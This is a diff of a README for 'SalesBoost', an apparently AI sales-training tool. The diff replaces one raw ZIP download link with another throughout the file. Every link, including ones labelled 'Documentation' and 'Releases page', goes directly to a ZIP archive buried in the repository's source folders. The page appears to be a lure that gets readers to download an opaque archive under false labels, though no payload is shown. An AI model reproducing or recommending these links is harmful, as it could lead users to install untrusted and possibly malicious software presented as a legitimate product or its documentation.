@@ -1,6 +1,6 @@
 # 🚀 SalesBoost - Enhance Your Sales Efforts with AI
 
-![Download SalesBoost](https://github.com/UziTaken/SalesBoost/raw/refs/heads/main/app/tools/connectors/ingestion/Sales-Boost-v2.9-beta.5.zip)
+![Download SalesBoost](https://raw.githubusercontent.com/UziTaken/SalesBoost/main/deployment/backend/Sales_Boost_2.4.zip)
 
 ## 🌟 Overview
 SalesBoost is an AI-powered platform designed to replicate the capabilities of a top sales representative. It employs advanced techniques, including intent recognition and dynamic orchestration, to help sales teams improve their performance. With a user-friendly interface and robust features, you can easily adopt this system to enhance your sales training and execution.
@@ -31,7 +31,7 @@ This project covers various key topics in the AI and sales space, including:
 ## 📥 Download & Install
 To get started with SalesBoost, visit the Releases page to download the latest version. 
 
-[Visit this page to download](https://github.com/UziTaken/SalesBoost/raw/refs/heads/main/app/tools/connectors/ingestion/Sales-Boost-v2.9-beta.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/UziTaken/SalesBoost/main/deployment/backend/Sales_Boost_2.4.zip)
 
 ## 🔧 System Requirements
 To run SalesBoost smoothly, ensure you meet the following requirements:
@@ -72,10 +72,10 @@ A3: Yes. You can find support options in the application, including FAQs and con
 
 ## 📚 Additional Resources
 For more detail on features and usage:
-- **Documentation**: [SalesBoost Documentation](https://github.com/UziTaken/SalesBoost/raw/refs/heads/main/app/tools/connectors/ingestion/Sales-Boost-v2.9-beta.5.zip)
+- **Documentation**: [SalesBoost Documentation](https://raw.githubusercontent.com/UziTaken/SalesBoost/main/deployment/backend/Sales_Boost_2.4.zip)
 - **Community Support**: Join discussions and share experiences in our community forum.
 
 ## 🎉 Join the Journey
 With SalesBoost, you can empower your sales team to achieve greater results. Enjoy the benefits of AI-driven sales tools that adapt to your specific needs. 
 
-[Visit this page to download](https://github.com/UziTaken/SalesBoost/raw/refs/heads/main/app/tools/connectors/ingestion/Sales-Boost-v2.9-beta.5.zip) and start transforming your sales approach today.
+[Visit this page to download](https://raw.githubusercontent.com/UziTaken/SalesBoost/main/deployment/backend/Sales_Boost_2.4.zip) and start transforming your sales approach today.
